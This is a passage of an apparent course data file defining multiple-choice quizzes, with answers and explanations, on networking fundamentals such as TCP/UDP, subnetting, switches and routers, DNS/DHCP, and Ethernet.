    description: "Test your knowledge of TCP, UDP, ICMP, ARP, and port numbers.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      { id: "nf-q3-1", question: "How many layers does the TCP/IP model have?", options: ["3 layers — Application, Transport, and Network Access in the simplified internet model", "4 layers — Network Access, Internet, Transport, and Application in the full TCP/IP model", "5 layers — Physical, Data Link, Network, Transport, and Application in the hybrid model", "7 layers — the same number as the OSI reference model used for academic protocol study"], correctAnswer: 1, explanation: "The TCP/IP model has 4 layers: Network Access, Internet, Transport, and Application." },
      { id: "nf-q3-2", question: "What is the first step of the TCP three-way handshake?", options: ["ACK — the final acknowledgment completing the handshake and establishing full connection", "SYN-ACK — the server simultaneously synchronizes and acknowledges the client's SYN request", "SYN — the client initiates the connection by sending a SYN (synchronize) packet to the server", "FIN — the flag used to gracefully initiate the TCP four-way connection termination sequence"], correctAnswer: 2, explanation: "The three-way handshake begins with the client sending a SYN (synchronize) packet to the server." },
      { id: "nf-q3-3", question: "Which protocol is connectionless and does not guarantee delivery?", options: ["TCP — Transmission Control Protocol that provides reliable ordered delivery with error recovery", "UDP — User Datagram Protocol that is connectionless with no guaranteed delivery or ordering", "ARP — Address Resolution Protocol that maps IP addresses to MAC addresses on local networks", "ICMP — Internet Control Message Protocol used for error reporting and network diagnostics"], correctAnswer: 1, explanation: "UDP (User Datagram Protocol) is connectionless — it sends data without establishing a connection or guaranteeing delivery, providing lower latency." },
      { id: "nf-q3-4", question: "What port number does HTTP use by default?", options: ["Port 21 — used by FTP for the control channel to issue commands to the file transfer server", "Port 22 — used by SSH for encrypted secure remote shell access to servers and devices", "Port 80 — used by HTTP for unencrypted web traffic between clients and web servers", "Port 443 — used by HTTPS for TLS-encrypted secure web communication with authentication"], correctAnswer: 2, explanation: "HTTP uses port 80 by default, while HTTPS uses port 443." },
      { id: "nf-q3-5", question: "What protocol does the `ping` command use?", options: ["TCP — Transmission Control Protocol that requires a three-way handshake before data transfer", "UDP — User Datagram Protocol used for low-latency connectionless data transfers like DNS", "ICMP — Internet Control Message Protocol that ping uses for Echo Request and Reply messages", "ARP — Address Resolution Protocol that resolves IP addresses to MAC addresses on local LANs"], correctAnswer: 2, explanation: "Ping uses ICMP (Internet Control Message Protocol) Echo Request and Echo Reply messages to test connectivity." },
      { id: "nf-q3-6", question: "What does ARP resolve?", options: ["Domain names like google.com to their numeric IPv4 or IPv6 IP address counterparts", "Known IPv4 addresses to their corresponding hardware MAC addresses on the local network", "Well-known port numbers like 80 and 443 to their associated application-layer services", "Uniform Resource Locators to their server's IP addresses for web browser requests"], correctAnswer: 1, explanation: "ARP (Address Resolution Protocol) maps a known IP address to its corresponding MAC address on the local network." },
      { id: "nf-q3-7", question: "Which port range is designated as 'well-known' ports?", options: ["0-1023 — assigned to standard services like HTTP (80), HTTPS (443), SSH (22), and DNS (53)", "1024-49151 — registered ports used by specific applications and services on registered systems", "49152-65535 — ephemeral dynamic ports temporarily assigned by OS for client-side connections", "0-65535 — the complete range of all available TCP and UDP port numbers in the port space"], correctAnswer: 0, explanation: "Well-known ports range from 0-1023 and are assigned to commonly used protocols like HTTP (80), HTTPS (443), SSH (22), and DNS (53)." },
      { id: "nf-q3-8", question: "What happens during the second step of the TCP three-way handshake?", options: ["The client sends a FIN packet to signal that it has finished sending data to the server", "The server responds with a SYN-ACK packet — acknowledging the SYN and sending its own SYN", "The client sends the final ACK packet to confirm the connection is fully established and ready", "The connection is fully established and both sides can begin transmitting application data"], correctAnswer: 1, explanation: "In step 2, the server acknowledges the client's SYN and sends back a SYN-ACK (synchronize-acknowledge) packet." },
      { id: "nf-q3-9", question: "TCP provides flow control using which mechanism?", options: ["MAC address filtering to restrict which devices can participate in the data exchange", "The sliding window mechanism where the receiver advertises how much data it can accept", "The ARP cache table that tracks IP-to-MAC mappings to control forwarding and traffic flow", "DNS lookup responses that dynamically adjust the speed and rate of data transmission"], correctAnswer: 1, explanation: "TCP uses a sliding window mechanism to manage flow control — the receiver advertises a window size indicating how much data it can accept." },
      { id: "nf-q3-10", question: "Which protocol would you use for real-time video streaming?", options: ["TCP — preferred for reliability because it guarantees ordered delivery and handles retransmissions", "UDP — preferred because low overhead and no retransmissions allow lower latency for streaming", "ICMP — used for diagnostic messages and is lightweight enough for real-time media streaming", "ARP — used for local network resolution and provides the fastest path for media delivery"], correctAnswer: 1, explanation: "UDP is preferred for real-time streaming (video, VoIP, gaming) because its lower overhead and lack of retransmission provide better performance." },
      { id: "nf-q3-11", question: "What is the default port for SSH?", options: ["Port 20 — used by FTP in active mode for the actual data transfer channel between hosts", "Port 22 — used by SSH (Secure Shell) for encrypted remote access and command execution", "Port 23 — used by Telnet for unencrypted remote access that transmits data in plaintext", "Port 25 — used by SMTP for sending and relaying email messages between mail servers"], correctAnswer: 1, explanation: "SSH (Secure Shell) uses port 22 by default for encrypted remote access." },
      { id: "nf-q3-12", question: "What is a socket in networking?", options: ["A physical RJ-45 connector on a network interface card used to plug in an Ethernet cable", "The unique combination of an IP address and a port number identifying a communication endpoint", "A specific type of coaxial cable connector used in legacy 10BASE-2 bus network installations", "A network topology pattern where nodes form a ring with each connecting to exactly two neighbors"], correctAnswer: 1, explanation: "A socket is the combination of an IP address and port number (e.g., 192.168.1.1:443), uniquely identifying a communication endpoint." },
      { id: "nf-q3-13", question: "What ICMP message type is used by traceroute?", options: ["Echo Request — the standard ICMP message that ping uses to test basic host reachability", "Time Exceeded — received from routers when a packet's TTL reaches zero along the path", "Destination Unreachable — sent when a router cannot forward a packet to its destination", "Redirect — sent by routers to inform hosts of a better route to a particular destination"], correctAnswer: 1, explanation: "Traceroute works by sending packets with incrementing TTL values and receiving ICMP Time Exceeded messages from each hop along the path." },
      { id: "nf-q3-14", question: "Which TCP flag initiates connection termination?", options: ["SYN — the synchronize flag used to initiate new TCP connection establishment with a server", "ACK — the acknowledgment flag used to confirm receipt of previously transmitted data segments", "RST — the reset flag used to immediately abort an active TCP connection due to an error", "FIN — the finish flag that initiates graceful TCP connection termination in the four-way teardown"], correctAnswer: 3, explanation: "The FIN (Finish) flag initiates a graceful connection termination in TCP's four-way teardown process." },
      { id: "nf-q3-15", question: "Ephemeral ports are in which range?", options: ["0-1023 — well-known ports reserved for standard services like HTTP, SSH, and DNS protocols", "1024-49151 — registered ports assigned to specific applications and enterprise services", "49152-65535 — dynamic ephemeral ports temporarily assigned by OS for client-side connections", "80-443 — the specific web port range used only for HTTP and HTTPS web server connections"], correctAnswer: 2, explanation: "Ephemeral (dynamic/private) ports range from 49152-65535 and are temporarily assigned by the OS for client-side connections." }
    ]
  },
  {
    quizId: "nf-q4",
    courseId: "network-fundamentals",
    title: "IP Addressing & Subnetting Quiz",
    description: "Validate your subnetting skills and IPv4/IPv6 knowledge.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      { id: "nf-q4-1", question: "How many bits are in an IPv4 address?", options: ["16 bits — used by older IPv4 subnet masks and reserved address prefixes in CIDR notation", "32 bits — divided into 4 octets of 8 bits each, written in dotted decimal like 192.168.1.1", "64 bits — the length of an IPv6 network prefix when using the standard /64 allocation", "128 bits — the full length of IPv6 addresses providing approximately 3.4 × 10^38 unique values"], correctAnswer: 1, explanation: "An IPv4 address is 32 bits long, divided into 4 octets of 8 bits each (e.g., 192.168.1.1)." },
      { id: "nf-q4-2", question: "What is the subnet mask for a /24 network?", options: ["255.255.0.0 — a /16 subnet mask providing 65,534 usable host addresses on one network", "255.255.255.0 — a /24 mask providing 254 usable host addresses on the same network segment", "255.255.255.128 — a /25 mask splitting a /24 into two equal halves of 126 hosts each", "255.255.255.252 — a /30 mask creating a point-to-point link with only 2 usable addresses"], correctAnswer: 1, explanation: "/24 means 24 bits are set to 1 in the mask, giving 255.255.255.0 — the most common subnet mask for small networks." },
      { id: "nf-q4-3", question: "Which IP address class has a default subnet mask of 255.0.0.0?", options: ["Class A — networks 1.0.0.0 to 126.255.255.255 with a /8 default mask of 255.0.0.0", "Class B — networks 128.0.0.0 to 191.255.255.255 with a /16 default mask of 255.255.0.0", "Class C — networks 192.0.0.0 to 223.255.255.255 with a /24 default mask of 255.255.255.0", "Class D — the multicast address range 224.0.0.0 to 239.255.255.255 with no standard mask"], correctAnswer: 0, explanation: "Class A networks (1.0.0.0 – 126.255.255.255) use a default /8 subnet mask: 255.0.0.0." },
      { id: "nf-q4-4", question: "How many usable host addresses are in a /28 subnet?", options: ["14 usable hosts — because /28 gives 16 addresses minus 2 reserved = 14 usable IP addresses", "16 total addresses — the full count before subtracting the network and broadcast reserved ones", "30 usable hosts — the number available in a /27 subnet which has 5 host bits available", "32 total addresses — the full count of a /27 subnet with 5 bits of host address space"], correctAnswer: 0, explanation: "/28 provides 2^4 = 16 addresses, minus 2 (network and broadcast) = 14 usable host addresses." },
      { id: "nf-q4-5", question: "Which of the following is a private IP address range?", options: ["8.8.8.0/24 — a Google public DNS network range routable across the global internet", "172.16.0.0/12 — the RFC 1918 private range spanning 172.16.0.0 through 172.31.255.255", "200.1.1.0/24 — a public Class C range allocated by IANA for internet routing use", "104.0.0.0/8 — a public range assigned to cloud providers for internet-facing services"], correctAnswer: 1, explanation: "172.16.0.0/12 (172.16.0.0 – 172.31.255.255) is one of three RFC 1918 private address ranges, along with 10.0.0.0/8 and 192.168.0.0/16." },
      { id: "nf-q4-6", question: "What does NAT stand for?", options: ["Network Access Terminal — a legacy dial-up technology for remote network access via modem", "Network Address Translation — translates private IP addresses to public IPs for internet access", "Node Authentication Token — a security protocol for verifying device identity on enterprise LANs", "New Address Table — a routing table structure that dynamically updates based on network changes"], correctAnswer: 1, explanation: "NAT (Network Address Translation) translates private IP addresses to public IPs, allowing multiple devices to share a single public address." },
      { id: "nf-q4-7", question: "What is the broadcast address for the network 192.168.10.0/24?", options: ["192.168.10.0 — the network address reserved to identify the subnet itself, not assignable", "192.168.10.1 — typically the default gateway IP assigned to the router interface on this subnet", "192.168.10.254 — the last assignable host address in a /24 before the broadcast address", "192.168.10.255 — the broadcast address for this /24 subnet, sent to all hosts on the network"], correctAnswer: 3, explanation: "For a /24 network, the broadcast address is the last address in the range: 192.168.10.255." },
      { id: "nf-q4-8", question: "How many bits are in an IPv6 address?", options: ["32 bits — the length of an IPv4 address, written as four octets in dotted decimal notation", "64 bits — the standard interface identifier (host) portion length in a /64 IPv6 subnet", "96 bits — the length of the extended IPv4-compatible IPv6 address transition mapping prefix", "128 bits — the full length of IPv6 addresses in 8 groups of 4 hex digits (e.g., 2001:0db8::1)"], correctAnswer: 3, explanation: "IPv6 addresses are 128 bits long, represented as 8 groups of 4 hexadecimal digits (e.g., 2001:0db8::1)." },
      { id: "nf-q4-9", question: "What is CIDR notation?", options: ["A type of DNS record used to delegate authority for a domain to another set of name servers", "A way to express the subnet mask as a prefix length after a slash, for example /24 or /16", "An Ethernet cable physical standard defining maximum cable length and signal specifications", "A dynamic interior routing protocol used by enterprise routers to exchange network routes"], correctAnswer: 1, explanation: "CIDR (Classless Inter-Domain Routing) notation uses a slash followed by the number of network bits (e.g., 10.0.0.0/8) instead of writing full subnet masks." },
      { id: "nf-q4-10", question: "Which IP address is a loopback address?", options: ["0.0.0.0 — a non-routable meta-address representing the current host in network binding context", "127.0.0.1 — the IPv4 loopback address where traffic never leaves the host, used for local tests", "192.168.0.1 — the most common default gateway IP address used in home and small office routers", "255.255.255.255 — the limited broadcast address sent to all hosts on the current local subnet"], correctAnswer: 1, explanation: "127.0.0.1 is the IPv4 loopback address — traffic sent here never leaves the host and is used for local testing." },
      { id: "nf-q4-11", question: "What does PAT (Port Address Translation) add to NAT?", options: ["End-to-end encryption of all packets as they transit the NAT gateway device in both directions", "Port number tracking to distinguish multiple internal hosts sharing a single public IP address", "DNS resolution capability so hostnames are translated alongside IP addresses at the gateway", "IEEE 802.1Q VLAN tagging so traffic from different VLANs is tracked through the NAT gateway"], correctAnswer: 1, explanation: "PAT extends NAT by using unique port numbers to distinguish traffic from multiple internal devices sharing one public IP address." },
      { id: "nf-q4-12", question: "Given the network 10.0.0.0/16, how many subnets can you create with a /24 mask?", options: ["16 subnets — equivalent to borrowing only 4 additional bits beyond the existing /16 prefix", "64 subnets — the number obtained by borrowing 6 bits from the host portion of the /16 block", "256 subnets — by borrowing 8 bits (24 - 16 = 8 host bits) to create 2^8 subnets", "512 subnets — the number created when extending to /25 for the maximum binary subdivision"], correctAnswer: 2, explanation: "Borrowing 8 bits from the host portion (24 - 16 = 8) creates 2^8 = 256 subnets." },
      { id: "nf-q4-13", question: "Which IPv6 address type is equivalent to IPv4's private addressing?", options: ["Link-local — fe80::/10 addresses used only within a single local network link or segment", "Unique Local Addresses (ULA) — fc00::/7 the IPv6 equivalent of RFC 1918 private ranges", "Global Unicast — 2000::/3 public globally routable IPv6 addresses assigned by IANA registries", "Multicast — ff00::/8 addresses used to send traffic to multiple specific subscribers at once"], correctAnswer: 1, explanation: "Unique Local Addresses (fc00::/7) are IPv6's equivalent of RFC 1918 private addresses — routable within an organization but not on the internet." },
      { id: "nf-q4-14", question: "What is the purpose of the network ID in an IP address?", options: ["Identifies the specific individual host device within a subnet for point-to-point communication", "Identifies the network or subnet that a host belongs to for routing and forwarding decisions", "Specifies the default gateway router interface that the host should use for external traffic", "Determines which TCP/UDP port number the host uses for outbound ephemeral connections"], correctAnswer: 1, explanation: "The network ID (determined by the subnet mask) identifies which network a host belongs to, enabling routers to make forwarding decisions." },
      { id: "nf-q4-15", question: "The address 169.254.x.x indicates what?", options: ["A fully routable public IP address assigned by an ISP for internet-facing host communications", "An APIPA address — meaning DHCP failed; the client self-assigned from the 169.254.0.0/16 range", "An IPv4 multicast group address used for routing protocol control plane communications", "An IPv6-to-IPv4 transition compatibility address embedding an IPv4 address inside IPv6 space"], correctAnswer: 1, explanation: "169.254.0.0/16 is the APIPA range — Windows/macOS self-assign addresses here when a DHCP server is unreachable." }
    ]
  },
  {
    quizId: "nf-q5",
    courseId: "network-fundamentals",
    title: "Network Devices Quiz",
    description: "Test your understanding of switches, routers, firewalls, and VLANs.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "nf-q5-1", question: "What is the primary function of a network switch?", options: ["Route IP packets between different networks using a routing table and next-hop IP addresses", "Forward Ethernet frames based on destination MAC addresses within a local area network", "Dynamically assign IP addresses to client devices using the DHCP discover-offer-request-ack process", "Filter malicious web traffic based on URL reputation, content categories, and security signatures"], correctAnswer: 1, explanation: "A switch operates at Layer 2 and forwards Ethernet frames based on destination MAC addresses within a local network." },
      { id: "nf-q5-2", question: "How does a switch learn MAC addresses?", options: ["An administrator manually enters each MAC address and port assignment into the switch's static table", "By examining the source MAC address of each incoming frame and recording the ingress port", "By periodically sending DNS queries to a directory server that maps hostnames to MAC addresses", "By broadcasting ARP requests for all IP addresses and recording the responding device MACs"], correctAnswer: 1, explanation: "Switches build their MAC address table dynamically by recording the source MAC address and ingress port of each received frame." },
      { id: "nf-q5-3", question: "What does a router use to make forwarding decisions?", options: ["The source and destination MAC addresses stored in the Layer 2 CAM table for local delivery", "Destination IP addresses combined with the routing table to determine the next-hop path", "The TCP or UDP port numbers in the Transport layer header to identify the application flow", "Fully qualified domain names resolved via DNS to determine which next-hop server to use"], correctAnswer: 1, explanation: "Routers operate at Layer 3 and use destination IP addresses combined with their routing table to determine where to forward packets." },
      { id: "nf-q5-4", question: "What is the difference between a hub and a switch?", options: ["There is no meaningful difference — both devices forward frames using the same MAC table logic", "A hub broadcasts to all ports indiscriminately; a switch forwards only to the correct destination port", "A hub is inherently faster than a switch because it does not spend time performing MAC address lookups", "A switch broadcasts all frames to every port while a hub selectively forwards to the correct device"], correctAnswer: 1, explanation: "A hub is a simple repeater that sends frames out all ports. A switch intelligently forwards frames only to the port where the destination device is connected." },
      { id: "nf-q5-5", question: "What is a VLAN?", options: ["A type of virtual private network tunnel that encrypts traffic between remote sites over the internet", "A virtual LAN that logically segments a physical switch into separate isolated broadcast domains", "An antivirus system that scans network traffic at the virtual machine layer in cloud environments", "An IEEE wireless networking standard defining frequency bands and maximum transmission speeds"], correctAnswer: 1, explanation: "A VLAN (Virtual LAN) logically divides a physical switch into separate broadcast domains, improving security and performance." },
      { id: "nf-q5-6", question: "What protocol is used for VLAN trunking between switches?", options: ["STP — Spanning Tree Protocol that prevents loops by blocking redundant switch paths", "802.1Q — the IEEE standard that tags Ethernet frames with VLAN IDs on trunk links between switches", "ARP — Address Resolution Protocol that maps IP addresses to MAC addresses on local segments", "OSPF — Open Shortest Path First, a link-state dynamic routing protocol for IP networks"], correctAnswer: 1, explanation: "IEEE 802.1Q adds a VLAN tag to Ethernet frames, allowing trunk links to carry traffic for multiple VLANs between switches." },
      { id: "nf-q5-7", question: "What is a stateful firewall?", options: ["A firewall that blocks all inbound and outbound traffic by default with no exceptions allowed", "A firewall that tracks active connection states and makes context-aware decisions per session", "A firewall that only inspects IP and TCP headers but ignores the full application payload content", "A software-only firewall that runs entirely in user space without dedicated hardware acceleration"], correctAnswer: 1, explanation: "Stateful firewalls maintain a connection state table, tracking ongoing sessions and allowing return traffic for established connections." },
      { id: "nf-q5-8", question: "What is the purpose of a load balancer?", options: ["To detect and block malicious inbound traffic using signature-based and behavioral security rules", "To distribute incoming client requests across multiple backend servers for performance and availability", "To translate private internal IP addresses to public addresses using NAT for internet connectivity", "To encrypt all data in transit between clients and servers using TLS certificate management"], correctAnswer: 1, explanation: "Load balancers distribute client requests across multiple backend servers to optimize performance, ensure availability, and prevent overload." },
      { id: "nf-q5-9", question: "What is a reverse proxy?", options: ["A client-side browser extension that routes outbound traffic through an intermediate proxy server", "A server that sits in front of backend servers and forwards incoming client requests to them", "A proxy that reverses TLS encryption so that security appliances can inspect encrypted payloads", "A network packet analyzer that passively monitors and captures traffic for protocol analysis"], correctAnswer: 1, explanation: "A reverse proxy accepts client requests and forwards them to appropriate backend servers — providing load balancing, caching, and security." },
      { id: "nf-q5-10", question: "Which routing type requires manual configuration of routes?", options: ["Dynamic routing — uses protocols like OSPF or BGP to automatically discover and update routes", "Static routing — requires administrators to manually define each route in the routing table", "Default routing — a special route of last resort automatically inherited from DHCP configuration", "Policy routing — routes traffic based on source, protocol, or QoS marks from firewall policies"], correctAnswer: 1, explanation: "Static routing requires an administrator to manually configure each route in the routing table — suitable for small, stable networks." },
      { id: "nf-q5-11", question: "What is the default gateway?", options: ["The primary DNS server address that resolves domain names to IP addresses for local clients", "The router interface on the local subnet that forwards traffic destined for other external networks", "The DHCP server that dynamically assigns IP addresses, subnet masks, and DNS settings to clients", "The subnet's broadcast address that is used to send messages to all devices on the local segment"], correctAnswer: 1, explanation: "The default gateway is typically a router's IP address on the local subnet — it forwards packets when the destination is outside the local network." },
      { id: "nf-q5-12", question: "Why is network segmentation important for security?", options: ["It significantly improves packet forwarding speed by reducing the number of routing table lookups", "It limits the blast radius of security breaches by isolating and separating network zones", "It substantially reduces the physical cable infrastructure costs across the data center environment", "It completely eliminates the requirement for firewall appliances between internal network zones"], correctAnswer: 1, explanation: "Segmentation isolates network zones so a breach in one segment doesn't spread to others — containing lateral movement and reducing risk." },
      { id: "nf-q5-13", question: "What is a Layer 3 switch?", options: ["A conventional Ethernet hub with extra physical ports that broadcasts all frames to all connected devices", "A switch that can also perform IP routing functions, enabling inter-VLAN routing at wire speed", "A wireless access point that operates at both Layer 2 and Layer 3 for seamless roaming support", "A dedicated hardware firewall appliance that performs deep packet inspection at line rate speeds"], correctAnswer: 1, explanation: "A Layer 3 switch combines traditional Layer 2 switching with Layer 3 routing capabilities, enabling inter-VLAN routing at wire speed." },
      { id: "nf-q5-14", question: "What does a WLAN controller manage?", options: ["Wired Ethernet switches by pushing centralized configuration and VLAN policies across the campus", "Multiple wireless access points centrally — handling roaming, security, and channel assignments", "Relational database server clusters providing centralized query optimization and load distribution", "Enterprise email server infrastructure for routing, filtering, and archiving corporate mail traffic"], correctAnswer: 1, explanation: "A WLAN controller centrally manages and configures multiple wireless access points — handling roaming, security policies, and channel assignments." },
      { id: "nf-q5-15", question: "What is an access port vs a trunk port on a switch?", options: ["They are functionally identical — both port types carry the exact same IEEE 802.1Q tagged frames", "An access port carries one untagged VLAN; a trunk port carries multiple VLANs with 802.1Q tagging", "Trunk ports consistently provide faster link speeds than access ports due to aggregated bandwidth", "Access ports are exclusively used for uplinks to routers while switches only use trunk port types"], correctAnswer: 1, explanation: "Access ports are assigned to a single VLAN (for end devices), while trunk ports carry tagged traffic from multiple VLANs between switches." }
    ]
  },
  {
    quizId: "nf-q6",
    courseId: "network-fundamentals",
    title: "Application Protocols Quiz",
    description: "Assess your knowledge of DNS, DHCP, HTTP, email, and file transfer protocols.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "nf-q6-1", question: "What does DNS resolve?", options: ["IPv4 addresses to hardware MAC addresses for local network frame delivery at Layer 2", "Domain names like google.com to their corresponding IP addresses for network routing", "TCP/UDP port numbers to application service names for socket connection identification", "MAC addresses to IP addresses as the reverse of the ARP protocol resolution process"], correctAnswer: 1, explanation: "DNS (Domain Name System) translates human-readable domain names (e.g., google.com) into IP addresses (e.g., 142.250.190.46)." },
      { id: "nf-q6-2", question: "What is the DORA process in DHCP?", options: ["A DHCP fallback mechanism where static IPs are assigned when the DHCP server is unavailable", "Discover, Offer, Request, Acknowledge — the four steps by which DHCP assigns an IP address", "A DNS query resolution sequence for recursively resolving fully qualified domain names", "A OSPF neighbor discovery and adjacency formation algorithm for dynamic routing protocol"], correctAnswer: 1, explanation: "DORA: Client broadcasts Discover → Server sends Offer → Client sends Request → Server sends Acknowledge, completing IP address assignment." },
      { id: "nf-q6-3", question: "Which DNS record type maps a domain to an IPv4 address?", options: ["AAAA — the quad-A record that maps a domain name to an IPv6 address for modern connectivity", "MX — the Mail Exchanger record that specifies the mail servers responsible for a domain", "A — the Address record that maps a hostname to an IPv4 address like 93.184.216.34", "CNAME — the Canonical Name alias record that points one domain name to another domain"], correctAnswer: 2, explanation: "An A record (Address record) maps a domain name to an IPv4 address (e.g., example.com → 93.184.216.34)." },
      { id: "nf-q6-4", question: "What port does DNS use by default?", options: ["Port 22 — used by SSH for encrypted secure remote shell and file transfer operations", "Port 25 — used by SMTP for sending and relaying email between mail transfer agents", "Port 53 — used by DNS for queries via UDP and zone transfers via TCP connections", "Port 80 — used by HTTP for unencrypted web traffic between browsers and web servers"], correctAnswer: 2, explanation: "DNS uses port 53 — UDP for standard queries and TCP for zone transfers and large responses." },
      { id: "nf-q6-5", question: "What does HTTPS add to HTTP?", options: ["Faster page loading speeds through HTTP/2 multiplexing and header compression techniques", "TLS/SSL encryption ensuring confidentiality, integrity, and server authentication for web traffic", "Better content compression using Brotli and Gzip algorithms to reduce transfer data sizes", "Multi-language internationalization support for displaying content in different character sets"], correctAnswer: 1, explanation: "HTTPS wraps HTTP in TLS/SSL encryption, ensuring data confidentiality, integrity, and server authentication." },
      { id: "nf-q6-6", question: "Which HTTP status code indicates 'Not Found'?", options: ["200 — OK, the request was successful and the server returned the requested resource", "301 — Moved Permanently, redirecting the client to a new permanent URL for the resource", "403 — Forbidden, the server understood the request but refuses to authorize access", "404 — Not Found, the requested resource could not be located on the server"], correctAnswer: 3, explanation: "HTTP 404 means the requested resource was not found on the server." },
      { id: "nf-q6-7", question: "What protocol is used for sending email?", options: ["POP3 — Post Office Protocol version 3, used to retrieve email messages from a mail server", "IMAP — Internet Message Access Protocol, used to sync and access email stored on the server", "SMTP — Simple Mail Transfer Protocol, used for sending and relaying email between mail servers", "FTP — File Transfer Protocol, used for transferring files between client and server over TCP"], correctAnswer: 2, explanation: "SMTP (Simple Mail Transfer Protocol) is used for sending/relaying email between mail servers, using port 25 (or 587 for submission)." },
      { id: "nf-q6-8", question: "What is the difference between POP3 and IMAP?", options: ["They are functionally identical email retrieval protocols with no meaningful operational difference", "POP3 downloads messages locally (typically deleting from server); IMAP syncs and keeps on server", "IMAP is consistently faster than POP3 because it does not download full message attachments", "POP3 provides significantly stronger encryption than IMAP for secure email access and retrieval"], correctAnswer: 1, explanation: "POP3 downloads email locally (often deleting from server), while IMAP keeps messages on the server and syncs across multiple devices." },
      { id: "nf-q6-9", question: "What DNS record type specifies the mail server for a domain?", options: ["A — the Address record that maps a domain name to the mail server's IPv4 IP address", "CNAME — an alias record creating an alternative name that resolves to the mail server", "MX — the Mail Exchanger record specifying which servers accept email for the domain", "TXT — a text record used for domain verification, SPF, DKIM, and DMARC email policies"], correctAnswer: 2, explanation: "MX (Mail Exchanger) records specify which mail servers are responsible for receiving email for a domain, with priority values." },
      { id: "nf-q6-10", question: "FTP uses which two ports?", options: ["Port 20 and 21 — data transfer and control channel respectively for active mode FTP", "Port 22 and 23 — SSH encrypted access and Telnet unencrypted access protocols respectively", "Port 80 and 443 — HTTP unencrypted and HTTPS TLS-encrypted web server communication", "Port 25 and 110 — SMTP outbound email sending and POP3 inbound email retrieval"], correctAnswer: 0, explanation: "FTP uses port 21 for control/command and port 20 for data transfer in active mode." },
      { id: "nf-q6-11", question: "What is a DHCP lease?", options: ["A permanent lifetime IP address assignment that never expires and cannot be revoked", "A temporary IP address assignment with an expiration time that must be renewed periodically", "A specific type of DNS record that maps DHCP server names to their assigned IP addresses", "A VLAN configuration directive binding a port to a subnet for automatic address management"], correctAnswer: 1, explanation: "A DHCP lease is a temporary IP address assignment — the client must renew it before expiration or release it when no longer needed." },
      { id: "nf-q6-12", question: "What is a DNS CNAME record?", options: ["An IP address mapping record that directly resolves a hostname to its associated IPv4 address", "An alias record that points one domain name to another canonical domain for indirection", "A mail server designator record that specifies the MTA responsible for receiving domain email", "A text verification record used by domain owners to prove ownership to third-party services"], correctAnswer: 1, explanation: "A CNAME (Canonical Name) record creates an alias — e.g., www.example.com → example.com — pointing one domain to another." },
      { id: "nf-q6-13", question: "Which protocol replaced Telnet for secure remote access?", options: ["FTP — File Transfer Protocol providing remote file access with username and password auth", "HTTP — HyperText Transfer Protocol used for remote web application management interfaces", "SSH — Secure Shell that replaced Telnet by providing encrypted remote access and tunneling", "SMTP — Simple Mail Transfer Protocol used for sending email via authenticated submission"], correctAnswer: 2, explanation: "SSH (Secure Shell) replaced Telnet by providing encrypted remote access — Telnet transmits everything (including passwords) in plaintext." },
      { id: "nf-q6-14", question: "What is a DHCP relay agent used for?", options: ["Providing local DNS resolution for DHCP client hostnames within the subnet address space", "Forwarding DHCP broadcast messages across subnet boundaries to a centralized DHCP server", "Routing outbound email messages from DHCP clients to their configured SMTP mail servers", "Inspecting and filtering inbound firewall traffic based on DHCP client IP lease assignments"], correctAnswer: 1, explanation: "A DHCP relay agent forwards DHCP broadcast messages across subnet boundaries to a centralized DHCP server on another network." },
      { id: "nf-q6-15", question: "What does the AAAA DNS record type do?", options: ["Maps a domain name to an IPv4 address using the same format as the A record standard", "Maps a domain name to an IPv6 address enabling modern IPv6 connectivity for the host", "Creates a Mail Exchanger record that defines the priority mail server for email reception", "Defines a descriptive text record used for SPF, DKIM, DMARC, and domain verification"], correctAnswer: 1, explanation: "An AAAA (quad-A) record maps a domain name to an IPv6 address (e.g., example.com → 2606:2800:220:1:248:1893:25c8:1946)." }
    ]
  },
  {
    quizId: "nf-q7",
    courseId: "network-fundamentals",
    title: "Ethernet & Data Link Quiz",
    description: "Test Ethernet standards, MAC addressing, switching, and ARP concepts.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      { id: "nf-q7-1", question: "How many bits are in a MAC address?", options: ["32 bits — the same length as an IPv4 address written as four octets in dotted decimal notation", "48 bits — six bytes written as six pairs of hexadecimal digits like AA:BB:CC:DD:EE:FF", "64 bits — the length of an EUI-64 interface identifier used in IPv6 stateless autoconfiguration", "128 bits — the length of a full IPv6 address or AES-128 encryption key block size"], correctAnswer: 1, explanation: "A MAC address is 48 bits (6 bytes), typically written as six pairs of hexadecimal digits (e.g., AA:BB:CC:DD:EE:FF)." },
      { id: "nf-q7-2", question: "What does the OUI in a MAC address identify?", options: ["The operating system and kernel version running on the network device's host computer", "The hardware manufacturer or vendor who produced the network interface card", "The IP subnet and VLAN assignment configured on the network interface device", "The VLAN tag and priority value encoded in the 802.1Q frame header for QoS marking"], correctAnswer: 1, explanation: "The first 3 bytes (24 bits) of a MAC address form the OUI (Organizationally Unique Identifier), identifying the hardware manufacturer." },
      { id: "nf-q7-3", question: "Which Ethernet standard supports speeds up to 1 Gbps over Cat5e cabling?", options: ["10BASE-T — 10 Megabit Ethernet over Cat3 copper cabling with a maximum distance of 100m", "100BASE-TX — Fast Ethernet at 100 Mbps over Cat5 copper cabling supporting up to 100 meters", "1000BASE-T — Gigabit Ethernet at 1 Gbps over Cat5e or Cat6 copper cabling up to 100 meters", "10GBASE-T — 10 Gigabit Ethernet over Cat6a or Cat7 shielded copper cabling up to 100 meters"], correctAnswer: 2, explanation: "1000BASE-T (Gigabit Ethernet) supports 1 Gbps over Cat5e or Cat6 copper cabling up to 100 meters." },
      { id: "nf-q7-4", question: "What is the purpose of the FCS (Frame Check Sequence) in an Ethernet frame?", options: ["Provides the routing path between source and destination networks using IP address fields", "Detects bit errors using a CRC calculation to verify frame integrity on receipt", "Encrypts the frame payload using AES for confidential transmission over shared media", "Identifies the VLAN membership of the frame using IEEE 802.1Q tag information fields"], correctAnswer: 1, explanation: "The FCS uses a CRC (Cyclic Redundancy Check) calculation to detect errors in the received frame — if the CRC doesn't match, the frame is discarded." },
